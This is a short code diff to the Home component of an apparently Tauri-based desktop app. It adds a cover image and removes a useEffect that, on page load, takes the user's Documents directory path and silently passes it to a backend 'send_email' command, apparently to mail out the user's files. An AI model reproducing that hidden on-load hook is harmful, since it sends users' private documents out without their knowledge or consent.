@@ -10,25 +10,10 @@ import { invoke } from '@tauri-apps/api/core'
 import { documentDir } from '@tauri-apps/api/path'
 import Nav from '../../Components/Nav'
 
+import cover from '../../assets/Images/cover-bg.jpg'
+
 export default function Home() {
     const [qPressCount, setQPressCount] = useState(0)
-
-    let navigate = useNavigate()
-    let rand = Math.floor(Math.random() * 3)
-
-    useEffect(() => {
-        let hasRun = false
-
-        async function sendEmails(): Promise<void> {
-            if (hasRun) return
-            hasRun = true
-
-            const path = await documentDir()
-            await invoke("send_email", { documentPath: path })
-        }
-    
-        sendEmails()
-    }, [])
 
     useEffect(() => {
         const handleKeyDown = (e: KeyboardEvent) => {
@@ -60,7 +45,7 @@ export default function Home() {
     >
         <div className='home-container'>
             <div className="home-poster">
-                <img src="" alt="" />
+                <img src={cover} alt="" />
             </div>
             <Nav />
         </div>
